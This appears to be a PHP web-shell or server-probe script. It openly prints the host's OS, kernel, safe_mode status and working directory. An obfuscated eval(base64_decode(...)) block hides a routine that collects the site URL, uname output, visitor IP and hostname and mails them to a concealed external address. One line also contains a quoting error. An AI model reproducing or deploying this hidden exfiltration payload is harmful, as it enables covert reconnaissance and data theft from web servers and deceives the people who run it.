<?
$win = strtolower(substr(PHP_OS,0,3)) == "win";
echo "Newbies<br>";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";echo Newbies</A></center><br>";
echo "<br>OSTYPE:$OS<br>";
echo "<br>Pwd:$xpwd<br>";
eval(base64_decode("JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJaR1ZsWTJ4MVkydDVRSGxoYUc5dkxtTnZiUT09Iik7Cigkc2FmZV9tb2RlKT8oJHNhZmVtb2RlPSJPTiIpOigkc2FmZW1vZGU9Ik9GRiIpOwokYmFzZT0iaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddOyAKJG5hbWUgPSBwaHBfdW5hbWUoKTsKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokaG9zdCA9IGdldGhvc3RieWFkZHIoJF9TRVJWRVJbUkVNT1RFX0FERFJdKTsKJHN1YmogPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107IAokbXNnID0gIlxuQkFTRTogJGJhc2VcbnVuYW1lIC1hOiAkbmFtZVxuSVA6ICRpcFxuSG9zdDogJGhvc3RcbiRwd2RzXG4iOwokZnJvbSA9IkZyb206IE1PREVfPSIuJHNhZmVtb2RlLiI8dG9vbEAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iPiI7Cm1haWwoICRjcmVhdG9yLCAkc3ViaiwgJG1zZywgJGZyb20pOw=="));
die("<center> UserID </center>");
?>

